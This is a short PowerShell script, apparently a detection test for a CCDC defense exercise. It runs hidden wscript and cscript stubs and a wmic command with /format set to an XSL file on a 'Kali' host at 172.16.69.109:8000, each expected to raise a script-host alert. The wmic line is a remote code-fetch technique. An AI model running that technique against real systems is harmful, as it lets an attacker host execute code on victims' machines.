param([string]$Kali = "172.16.69.109")
Write-Host "[1] wscript with a staged VBS (expect EVT-SCRIPTHOST)..."
Set-Content C:\Users\Public\ccdc_stager_test.vbs "WScript.Quit"
Start-Process wscript.exe -ArgumentList "C:\Users\Public\ccdc_stager_test.vbs" -WindowStyle Hidden
Start-Sleep 4
Write-Host "[2] cscript with a staged JS..."
Set-Content C:\Users\Public\ccdc_stager_test.js "WScript.Quit()"
Start-Process cscript.exe -ArgumentList "C:\Users\Public\ccdc_stager_test.js" -WindowStyle Hidden
Start-Sleep 4
Write-Host "[3] wmic remote-format pattern (expect EVT-SCRIPTHOST on /format:http)..."
Start-Process wmic.exe -ArgumentList "/format:`"http://${Kali}:8000/x.xsl`"" -WindowStyle Hidden
Write-Host "cleanup: Remove-Item C:\Users\Public\ccdc_stager_test.*"
